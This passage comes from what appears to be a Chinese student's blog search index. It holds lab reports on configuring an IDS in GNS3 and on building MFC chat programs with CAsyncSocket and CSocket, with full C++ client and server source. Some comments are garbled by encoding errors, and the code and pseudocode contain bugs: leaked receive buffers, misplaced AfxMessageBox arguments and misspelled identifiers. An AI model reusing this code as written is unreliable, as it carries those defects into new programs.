-u","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"IDS设备的配置和使用","slug":"IDS设备的配置和使用","date":"2020-12-04T18:42:46.000Z","updated":"2024-11-12T06:59:40.000Z","comments":true,"path":"2020/12/05/IDS设备的配置和使用/","permalink":"https://gryffinbit.top/2020/12/05/IDS%E8%AE%BE%E5%A4%87%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/","excerpt":"","text":"IDS设备的配置和使用实验目的： 熟悉IDS设备的部署方式 掌握设备的连接和简单设置 实验环境：物理主机：macOS Catalina 虚拟机：Windows 实验内容： GNS3安装与基本操作 路由器配置 IDS配置 实验过程： 一、GNS3安装与基本操作 👉安装GNS3，基本配置 R1，ping虚拟机，成功 👉桥接模式 👉配置IDS 进行网络联通的检测 虚拟机和宿主机之间可以ping通 进行初始登陆 进行配置，开启web服务 IDS和虚拟机可以双向ping通","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"GNS3","slug":"GNS3","permalink":"https://gryffinbit.top/tags/GNS3/"},{"name":"IDS","slug":"IDS","permalink":"https://gryffinbit.top/tags/IDS/"}],"author":"Gryffinbit"},{"title":"用CAsyncSocket类实现聊天室程序","slug":"用CAsyncSocket类实现聊天室程序","date":"2020-12-01T11:35:51.000Z","updated":"2024-11-12T06:59:54.000Z","comments":true,"path":"2020/12/01/用CAsyncSocket类实现聊天室程序/","permalink":"https://gryffinbit.top/2020/12/01/%E7%94%A8CAsyncSocket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"实验目标简单的聊天室程序，采用C&#x2F;S模型，分为客户端和服务器端程序。是点对点通信的程序。客户端和服务器端通过网络交换聊天的字符串内容，并显示。 实验目的 学习如何从CAsyncSocket类派生出自己的WinSock类。 理解WinSock类与应用程序框架的关系 学习流式套接字对象的使用 学习处理网络事件的方法 了解MFC编程 实验环境Windows10 x64，Visual Studio 2017 实验内容分为两大块，创建客户端和创建服务器端。 客户端 使用MFC ApplicationWizard创建客户端应用程序框架 为对话框界面添加控件对象 为对话框中的控件对象定义相应的成员变量 创建从CAsynSocket类继承的派生类 为对话框类添加控件对象事件的响应函数 为CtalkcDlg对话框类添加其他的成员函数和成员变量 添加关于控件变量的初始化代码 添加事件函数和成员函数的代码 服务器端 与客户端同理 实验原理服务器端： 创建一个套接字 创建Socket，绑定到指定端口 启动监听，准备客户端的连接请求 接收连接 消息的传送 关闭套接字 客户端： 创建一个套接字 创建Socket 请求连接服务器 消息的传送 关闭套接字 实验过程(代码分析）👉创造程序框架 （MFC基于对话框） 👉添加控件对象 👉添加控件成员变量 CSocket类从CAsynSocket类继承了许多成员函数，封装了Windows套接字应用程序编程接口API。 应用程序类Ctalkc\\s App对应文件VC++自动生成 派生类CMySocket对应文件对CMySocket进行定义。它是从CAsynSocket类继承下来的派生类，将Socket事件传给对话框，以便执行用户自己的事件处理函数。 1class CMySocket:public CAsynSocket 添加事件响应函数，用于连接、断开、和接收 服务器端： ✏️MySocket.h 12345678910111213141516171819202122#pragma once#include &lt;afxsock.h&gt;class CtalksDlg;////////////////////////////////class CMySocket : public CAsyncSocket&#123;public: CMySocket(); virtual ~CMySocket();public: virtual void OnAccept(int nErrorCode); virtual void OnClose(int nErrorCode); virtual void OnReceive(int nErrorCode);private: CtalksDlg* m_pDlg;public: void SetParent(CtalksDlg* pDlg);&#125;; ✏️MySocket.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &quot;talks.h&quot;#include &quot;pch.h&quot;#include &quot;MySocket.h&quot;#include &quot;talksDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#undef THIS_FILE#endif// CMySocketCMySocket::CMySocket()&#123; m_pDlg = NULL;&#125;CMySocket::~CMySocket()&#123; m_pDlg = NULL;&#125;void CMySocket::SetParent(CtalksDlg* pDlg)&#123; m_pDlg = pDlg;&#125;#if 0BEGIN_MESSAGE_MAP(CMySocket, CAsyncSocket)END_MESSAGE_MAP()#endif//CMySocket member functionsvoid CMySocket::OnAccept(int nErrorCode)&#123; if (nErrorCode == 0) m_pDlg-&gt;OnAccept();&#125;void CMySocket::OnClose(int nErrorCode)&#123; if (nErrorCode == 0) m_pDlg-&gt;OnClose();&#125;void CMySocket::OnReceive(int nErrorCode)&#123; if (nErrorCode == 0) m_pDlg-&gt;OnReceive();&#125; 客户端： ✏️MySocket.h 12345678910111213141516171819202122#pragma once#include &lt;afxsock.h&gt;class CtalkcDlg;//////////////////////////////////CMySocket ÀàµÄ¶¨Òåclass CMySocket : public CAsyncSocket&#123;public: CMySocket(); virtual ~CMySocket();public: virtual void OnConnect(int nErrorCode); virtual void OnClose(int nErrorCode); virtual void OnReceive(int nErrorCode);private: CtalkcDlg* m_pDlg;public: void SetParent(CtalkcDlg* pDlg);&#125;; ✏️MySocket.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &quot;talkc.h&quot;#include &quot;pch.h&quot;#include &quot;MySocket.h&quot;#include &quot;talkcDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#undef THIS_FILE#endif// CMySocketCMySocket::CMySocket()&#123; m_pDlg = NULL; &#125;CMySocket::~CMySocket()&#123; m_pDlg = NULL;&#125;void CMySocket::SetParent(CtalkcDlg* pDlg)&#123; // TODO: ÔÚ´Ë´¦Ìí¼ÓÊµÏÖ´úÂë. m_pDlg = pDlg;&#125;#if 0BEGIN_MESSAGE_MAP(CMySocket, CAsyncSocket)END_MESSAGE_MAP()#endif//CMySocket member functionsvoid CMySocket::OnConnect(int nErrorCode)&#123; // TODO: ÔÚ´ËÌí¼Ó×¨ÓÃ´úÂëºÍ/»òµ÷ÓÃ»ùÀà if (nErrorCode == 0) m_pDlg -&gt; OnConnect(); &#125;void CMySocket::OnClose(int nErrorCode)&#123; // TODO: ÔÚ´ËÌí¼Ó×¨ÓÃ´úÂëºÍ/»òµ÷ÓÃ»ùÀà if (nErrorCode == 0) m_pDlg-&gt;OnClose();&#125;void CMySocket::OnReceive(int nErrorCode)&#123; // TODO: ÔÚ´ËÌí¼Ó×¨ÓÃ´úÂëºÍ/»òµ÷ÓÃ»ùÀà if (nErrorCode == 0) m_pDlg-&gt;OnReceive(); &#125; 对话框类CTalkDlg对应文件主要是对控件变量的声明和定义。 服务器端： ✏️talksDlg.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// talksDlg.h: 头文件//#pragma once#include &quot;MySocket.h&quot;// CtalksDlg 对话框class CtalksDlg : public CDialogEx&#123;// 构造public: CtalksDlg(CWnd* pParent = nullptr); // 标准构造函数// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TALKS_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: HICON m_hIcon; // 生成的消息映射函数 virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: afx_msg void OnLbnSelchangeList2(); CButton m_btnListen; CString m_strServName; int m_nServPort; CString m_strMsg; CListBox m_listSent; CListBox m_listReceived; afx_msg void OnButtonClose(); afx_msg void OnButtonListen(); afx_msg void OnSendMsg(); CMySocket m_sListenSocket; CMySocket m_sConnectSocket; void OnClose(); void OnAccept(); void OnReceive();&#125;; ✏️talksDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273// talksDlg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;talks.h&quot;#include &quot;talksDlg.h&quot;#include &quot;afxdialogex.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// 用于应用程序“关于”菜单项的 CAboutDlg 对话框class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CtalksDlg 对话框CtalksDlg::CtalksDlg(CWnd* pParent /*=nullptr*/) : CDialogEx(IDD_TALKS_DIALOG, pParent) , m_strServName(_T(&quot;&quot;)) , m_nServPort(0) , m_strMsg(_T(&quot;&quot;))&#123; m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);&#125;void CtalksDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_BUTTON_LISTEN, m_btnListen); DDX_Text(pDX, IDC_EDIT_SERVNAME, m_strServName); DDX_Text(pDX, IDC_EDIT_SERVPORT, m_nServPort); DDX_Text(pDX, IDC_EDIT_MSG, m_strMsg); DDX_Control(pDX, IDC_LIST_SENT, m_listSent); DDX_Control(pDX, IDC_LIST_RECEIVED, m_listReceived);&#125;BEGIN_MESSAGE_MAP(CtalksDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON_CLOSE, &amp;CtalksDlg::OnButtonClose) ON_BN_CLICKED(IDC_BUTTON_LISTEN, &amp;CtalksDlg::OnButtonListen) ON_BN_CLICKED(IDOK, &amp;CtalksDlg::OnSendMsg)END_MESSAGE_MAP()// CtalksDlg 消息处理程序BOOL CtalksDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // 将“关于...”菜单项添加到系统菜单中。 // IDM_ABOUTBOX 必须在系统命令范围内。 ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // 设置此对话框的图标。 当应用程序主窗口不是对话框时，框架将自动 // 执行此操作 SetIcon(m_hIcon, TRUE); // 设置大图标 SetIcon(m_hIcon, FALSE); // 设置小图标 // TODO: 在此添加额外的初始化代码 m_strServName = &quot;localhost&quot;; m_nServPort = 1000; UpdateData(FALSE); m_sListenSocket.SetParent(this); m_sConnectSocket.SetParent(this); return TRUE; // 除非将焦点设置到控件，否则返回 TRUE&#125;void CtalksDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// 如果向对话框添加最小化按钮，则需要下面的代码// 来绘制该图标。 对于使用文档/视图模型的 MFC 应用程序，// 这将由框架自动完成。void CtalksDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // 用于绘制的设备上下文 SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // 使图标在工作区矩形中居中 int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // 绘制图标 dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//当用户拖动最小化窗口时系统调用此函数取得光标//显示。HCURSOR CtalksDlg::OnQueryDragIcon()&#123; return static_cast&lt;HCURSOR&gt;(m_hIcon);&#125;void CtalksDlg::OnButtonClose()&#123; // TODO: 在此添加控件通知处理程序代码 OnClose();&#125;void CtalksDlg::OnButtonListen()&#123; UpdateData(TRUE); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(FALSE); m_sListenSocket.Create(m_nServPort); m_sListenSocket.Listen();&#125;void CtalksDlg::OnSendMsg()&#123; // TODO: 在此添加控件通知处理程序代码 int nLen; int nSent; UpdateData(TRUE); if (!m_strMsg.IsEmpty()) &#123; nLen = m_strMsg.GetLength(); nSent = m_sConnectSocket.Send(LPCTSTR(m_strMsg), nLen); if (nSent != SOCKET_ERROR) &#123; m_listSent.AddString(m_strMsg); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;信息发送错误！&quot;, MB_OK | MB_ICONSTOP)); &#125; m_strMsg.Empty(); UpdateData(FALSE); &#125;&#125;void CtalksDlg::OnClose()&#123; m_listReceived.AddString(&quot;服务器已经收到啦OnClose的消息♥&quot;); m_sConnectSocket.Close(); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); while (m_listSent.GetCount() != 0) m_listSent.DeleteString(0); while (m_listReceived.GetCount() != 0) m_listReceived.DeleteString(0); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(TRUE);&#125;void CtalksDlg::OnAccept()&#123; // TODO: 在此处添加实现代码. m_listReceived.AddString(&quot;服务器已经收到啦OnAccept的消息!!&quot;); m_sListenSocket.Accept(m_sConnectSocket); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(TRUE); &#125;void CtalksDlg::OnReceive()&#123; char *pBuf = new char[1025]; int nBufSize = 1024; int nReceived; CString strReceived; m_listReceived.AddString(&quot;服务器已经收到啦OnReceive的消息!!&quot;); nReceived = m_sConnectSocket.Receive(pBuf, nBufSize); if (nReceived != SOCKET_ERROR) &#123; pBuf[nReceived] = NULL; strReceived = pBuf; m_listReceived.AddString(strReceived); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;信息接收出错啦！！&quot;, MB_OK | MB_ICONSTOP)); &#125;&#125; 客户端： ✏️talkcDlg.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#if _MSC_VER &gt; 1000#pragma once#endif // _MSC_VER &gt;1000// talkcDlg.h: 头文件//#include &quot;MySocket.h&quot;#pragma once// CtalkcDlg 对话框class CtalkcDlg : public CDialogEx&#123;// 构造public: void OnClose(); void OnConnect(); void OnReceive(); CMySocket m_sConnectSocket; CtalkcDlg(CWnd* pParent = nullptr); // 标准构造函数// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TALKC_DIALOG &#125;;#endif CListBox m_listSent; CListBox m_listReceived; CButton m_btnConnect; CString m_strMsg; CString m_strServName; int m_nServPort; protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: HICON m_hIcon; // 生成的消息映射函数 virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: afx_msg void OnButtonClose(); afx_msg void OnButtonConnect(); afx_msg void OnSendMsg();&#125;; ✏️talkcDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273// talkcDlg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;talkc.h&quot;#include &quot;talkcDlg.h&quot;#include &quot;afxdialogex.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// 用于应用程序“关于”菜单项的 CAboutDlg 对话框class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CtalkcDlg 对话框CtalkcDlg::CtalkcDlg(CWnd* pParent /*=NULL*/) : CDialogEx(IDD_TALKC_DIALOG, pParent) , m_strServName(_T(&quot;&quot;)) , m_nServPort(0) , m_strMsg(_T(&quot;&quot;))&#123; m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);&#125;void CtalkcDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_BUTTON_CONNECT, m_btnConnect); DDX_Text(pDX, IDC_EDIT_SERNAME, m_strServName); DDX_Text(pDX, IDC_EDIT_SERVPORT, m_nServPort); DDX_Text(pDX, IDC_EDIT_MSG, m_strMsg); DDX_Control(pDX, IDC_LIST_SENT, m_listSent); DDX_Control(pDX, IDC_LIST_RECEIVED, m_listReceived);&#125;BEGIN_MESSAGE_MAP(CtalkcDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON_CLOSE, &amp;CtalkcDlg::OnButtonClose) ON_BN_CLICKED(IDC_BUTTON_CONNECT, &amp;CtalkcDlg::OnButtonConnect) ON_BN_CLICKED(IDOK, &amp;CtalkcDlg::OnSendMsg)END_MESSAGE_MAP()// CtalkcDlg 消息处理程序BOOL CtalkcDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // 将“关于...”菜单项添加到系统菜单中。 // IDM_ABOUTBOX 必须在系统命令范围内。 ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // 设置此对话框的图标。 当应用程序主窗口不是对话框时，框架将自动 // 执行此操作 SetIcon(m_hIcon, TRUE); // 设置大图标 SetIcon(m_hIcon, FALSE); // 设置小图标 // TODO: 在此添加额外的初始化代码 m_strServName = &quot;localhost&quot;; m_nServPort = 1000; UpdateData(FALSE); GetDlgItem(IDC_BUTTON_CONNECT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(FALSE); m_sConnectSocket.SetParent(this); return TRUE; // 除非将焦点设置到控件，否则返回 TRUE&#125;void CtalkcDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// 如果向对话框添加最小化按钮，则需要下面的代码// 来绘制该图标。 对于使用文档/视图模型的 MFC 应用程序，// 这将由框架自动完成。void CtalkcDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // 用于绘制的设备上下文 SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // 使图标在工作区矩形中居中 int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // 绘制图标 dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//当用户拖动最小化窗口时系统调用此函数取得光标//显示。HCURSOR CtalkcDlg::OnQueryDragIcon()&#123; return static_cast&lt;HCURSOR&gt;(m_hIcon);&#125;void CtalkcDlg::OnButtonConnect()&#123; // TODO: 在此添加控件通知处理程序代码 UpdateData(TRUE); GetDlgItem(IDC_BUTTON_CONNECT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(FALSE); m_sConnectSocket.Create(); m_sConnectSocket.Connect(m_strServName, m_nServPort);&#125;void CtalkcDlg::OnSendMsg()&#123; // TODO: 在此添加控件通知处理程序代码 int nLen; int nSent; UpdateData(TRUE); if (!m_strMsg.IsEmpty()) &#123; nLen = m_strMsg.GetLength(); nSent = m_sConnectSocket.Send(LPCTSTR(m_strMsg), nLen); if (nSent != SOCKET_ERROR) &#123; m_listSent.AddString(m_strMsg); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;信息发送错误！&quot;, MB_OK | MB_ICONSTOP)); &#125; m_strMsg.Empty(); UpdateData(FALSE); &#125;&#125;void CtalkcDlg::OnButtonClose()&#123; // TODO: 在此添加控件通知处理程序代码 OnClose();&#125;void CtalkcDlg::OnReceive()&#123; // TODO: 在此处添加实现代码. char *pBuf = new char[1025]; int nBufSize = 1024; int nReceived; CString strReceived; nReceived = m_sConnectSocket.Receive(pBuf, nBufSize); if (nReceived != SOCKET_ERROR) &#123; pBuf[nReceived] = NULL; strReceived = pBuf; m_listReceived.AddString(strReceived); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;信息接收出错啦！！&quot;, MB_OK | MB_ICONSTOP)); &#125;&#125;void CtalkcDlg::OnConnect()&#123; // TODO: 在此处添加实现代码. //开放连接配置的相关控件，如“连接”按钮、服务器名称、端口的文本框和标签 GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(TRUE);&#125;void CtalkcDlg::OnClose()&#123; // TODO: 在此处添加实现代码. m_sConnectSocket.Close(); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); while (m_listSent.GetCount() != 0) m_listSent.DeleteString(0); while (m_listReceived.GetCount() != 0) m_listReceived.DeleteString(0); GetDlgItem(IDC_BUTTON_CONNECT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(TRUE);&#125; 实验界面结果展示 实验过程中遇到的问题⛔️关于字符的问题 💚在配置中调属性，或宏定义_T_。解决该报错 实验参考书客户端 服务器端","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"网络编程","slug":"实验/网络编程","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"},{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"},{"name":"CAsyncSocket","slug":"CAsyncSocket","permalink":"https://gryffinbit.top/tags/CAsyncSocket/"}],"author":"Gryffinbit"},{"title":"用CSocket类实现聊天室程序","slug":"用CSocket类实现聊天室程序","date":"2020-12-01T11:15:31.000Z","updated":"2024-11-12T06:59:54.000Z","comments":true,"path":"2020/12/01/用CSocket类实现聊天室程序/","permalink":"https://gryffinbit.top/2020/12/01/%E7%94%A8CSocket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"实验目标采用C&#x2F;S模型，分为客户端和服务器端程序。服务器可以与多个客户端建立连接，为多个客户机服务。服务器动态统计进入聊天室的客户端数量，并显示。会显示进入和退出聊天室的动态。 采用链表来管理客户机的套接字对象。 实验目的 学习如何从CSocket类派生出自己的WinSock类。 学习如何利用CSocketFile类、CArchive类和CSocket类的合作来实现网络进程之间的数据传输。 学习如何用链表管理多个动态客户机的套接字，实现服务器和所有的聊天客户机所显示信息的同步更新 实验环境Windows10 x64，Visual Studio 2017 实验内容分为两大块，创建客户端和创建服务器端。 服务器端： 使用MFC ApplicationWizard创建客户端应用程序框架 为对话框界面添加控件对象 为对话框中的控件对象定义相应的成员变量 创建从CSocket类继承的派生类 为对话框类添加控件对象事件的响应函数 为CTsDlg对话框类添加其他的成员函数和成员变量 创建专用于数据传输序列化处理的类CMsg 添加事件函数和成员函数的代码 客户端：与服务器端同理 实验原理（模型）服务器端： 创建空的服务器监听套接字对象 1CSocket sockserv; 创建监听套接字对象底层句柄 1CLSocket.Create(8000); 启动监听，准备客户端的连接请求 1sockServ.Listen(); 接收连接，进入与客户机的会话期。动态的为客户机创建连接套接字对象（采用链表来管理套接字对象） 12CSocket sockRecvsockServ.Accept(sockRecv); 创建文件对象并关联到套接字对象 12CSocketFile* m_pFile; //定义一个CSocketFile对象指针file = new CSocketFile(&amp;sockRecv); 消息的传送 1234CArchive* arIn,arOut;arIn = CArchive(&amp;file,CArchive::load); //创建用于输入的CArchive对象arOut = CArchive(&amp;file,CArchive::store); //创建用于输出的CArchive对象//CArchive对象需要关联到文件对象 12arIn &gt;&gt; dwValue; //进行数据输入adOut &lt;&lt; dwValue; //数据输出 关闭套接字 12sockRecv.Close();sockSecv.Close(); 创建CSocket对象分为两步：1. 调用CSocket类的构造函数，创建一个空的CSocket对象。2. 调用此CSocket对象的Create（）成员函数，创建对象的底层套接字 客户端： 创建空的客户端套接字对象 1CSocket sockClient; 创建套接字对象底层句柄 1sockClient.Create(); 请求连接到服务器 1sockClient.Connect(strAddr,nPort); 创建文件对象并关联到套接字对象 12CSocketFile* m_pFile; //定义一个CSocketFile对象指针file = new CSocketFile(&amp;sockClient); 消息的传送 1234CArchive* arIn,arOut;arIn = CArchive(&amp;file,CArchive::load); //创建用于输入的CArchive对象arOut = CArchive(&amp;file,CArchive::store); //创建用于输出的CArchive对象//CArchive对象需要关联到文件对象 12arIn &gt;&gt; dwValue; //进行数据输入adOut &lt;&lt; dwValue; //数据输出 关闭套接字 